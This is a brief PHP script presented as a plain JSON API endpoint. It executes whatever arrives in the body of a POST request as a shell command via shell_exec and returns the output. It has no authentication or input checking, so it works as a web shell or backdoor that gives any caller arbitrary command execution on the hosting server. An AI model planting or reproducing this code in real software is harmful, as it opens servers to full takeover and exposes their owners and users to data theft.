<?php
header('Content-Type: application/json');
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}
$cmd = file_get_contents('php://input');
$output = shell_exec($cmd);
echo json_encode(['output' => $output]);
?>
